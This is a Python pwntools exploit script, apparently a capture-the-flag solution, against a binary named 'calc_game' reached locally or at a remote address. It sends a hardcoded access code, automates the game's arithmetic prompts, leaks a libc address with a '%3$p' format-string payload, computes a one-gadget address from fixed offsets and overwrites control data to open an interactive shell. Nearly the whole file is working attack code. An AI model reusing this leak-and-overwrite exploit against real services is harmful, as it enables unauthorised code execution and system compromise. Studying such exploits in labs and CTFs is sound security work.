from pwn import *

DEBUG=1

if DEBUG:
    os.environ["LD_PRELOAD"] = os.path.join(os.getcwd(),'libc.so.6')
    context.log_level = 'debug'
    p = process("./calc_game")
else:
    context.log_level = 'info'
    p = remote("117.34.105.33",6001)
#libc = ELF('./libc.so.6')
#elf = ELF("./calc_game")
def sendpwd():
    p.recvuntil('privileged code:')
    p.sendline('1234567')

def yes():
    p.recvuntil("[yes/no]")
    p.sendline("y")

def solve():
    p.recvuntil("formula is:")
    answer = p.recvuntil("\n")
    p.recvuntil("answer is:")
    p.send(answer)

def solve3():
    solve()
    solve()
    solve()
def solvea():
    solve3()
    yes()
    solve3()
    yes()
    solve3()
    yes()
    solve3()
def exp():
    sendpwd()
    yes()
    solvea()
    p.recvuntil("name:")
    #leak libc addr see [https://ctf-wiki.github.io/ctf-wiki/pwn/fmtstr/fmtstr_exploit/]
    payload = "%3$p"
    p.sendline(payload)
    p.recvuntil("Hello, ")
    leak = p.recvuntil("\n")[2:-1]
    leak_addr = int(leak,16)
    #local debug get offset *Tip:Run[export LD_PRELOAD=/root/libc.so.6] firstly 
    #leak_offset=0xF75874AD(fmtstr3_leak)-0xF7554000(libc_base)=0x334ad
    base_addr = leak_addr - 0x334ad
    #use ida find execv xref and get addr (normal is in sub-func of system)
    one_addr = base_addr + 0x401b3
    print "leak_addr = " + hex(leak_addr)
    print "base_addr = " + hex(base_addr)
    print "one_addr = " + hex(one_addr)
    if args['DEBUG']:
        pause()
    yes()
    solve3()
    payload = "nnnnnnnn" + p32(one_addr)
    p.sendline(payload)
    p.sendline("n")
    p.recvuntil("exit now......")
    p.interactive() 

if __name__ == "__main__":
    exp()
